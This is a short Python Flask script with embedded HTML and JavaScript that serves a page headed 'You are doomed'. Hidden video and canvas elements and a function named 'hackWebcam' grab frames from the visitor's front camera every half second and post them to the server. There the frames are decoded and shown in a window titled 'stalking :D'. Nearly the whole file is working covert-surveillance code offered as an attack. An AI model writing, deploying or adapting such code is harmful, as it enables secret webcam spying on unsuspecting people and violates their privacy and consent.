
from flask import Flask
from flask import request
from flask import render_template_string
import base64
import numpy as np
import threading
import cv2
from pynput.keyboard import Key, Controller



keyboard = Controller()
app = Flask(__name__)

def update(frame):
    cv2.imshow('stalking :D', frame)
    cv2.waitKey(0)
    cv2.destroyAllWindows()



@app.route('/stream',methods=['POST'])
def stalk():

    # extract base64 encoded string from client
    img_str = request.form.get('frame').split('data:image/png;base64,')[-1]
    
    # convert base64 encoded string into byte string
    img_bytes = base64.b64decode(img_str)

    # convert the byte string into a numpy array
    image = np.frombuffer(img_bytes,np.uint8)

    # convert a numpy array to opencv compatible img
    frame = cv2.imdecode(image, cv2.IMREAD_COLOR)

    # display the fram in  a window
    display_thread = threading.Thread(target=update, args=(frame,))
    display_thread.start()
    keyboard.press('c')
    keyboard.release('c')
    return ''

@app.route('/')
def index():
    return render_template_string('''
    <h1 align="center" > You are doomed</h>

    <video hidden="true"  id="video" playsinline autoplay > </video>
    
    <canvas  hidden id="canvas" width="640" height="640" > canvas </canvas>
    
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <script>

       function post(imgdata){
            $.ajax({
            type: 'POST',
            data: {frame: imgdata}, // "frame" is the data name that we going to access in the backend
            url: '/stream',
            dataType: 'json',
            async: false
            });
        }

      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      const constraints = {
        audio : false,
        video : {facingMode : "user"}
      };

      async function hackWebcam() {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        window.stream = stream;
        video.srcObject = stream;

        var context = canvas.getContext('2d');

        setInterval(()=>{
            context.drawImage(video, 0, 0, 640, 640);
            var canvasData = canvas.toDataURL("image/png") // convert image to base64 data in order to send it throu  the post request
           post(canvasData);
        },500)

      }
        hackWebcam();

    </script>
    ''')



if __name__ == '__main__':
    app.run(debug=True,threaded=True)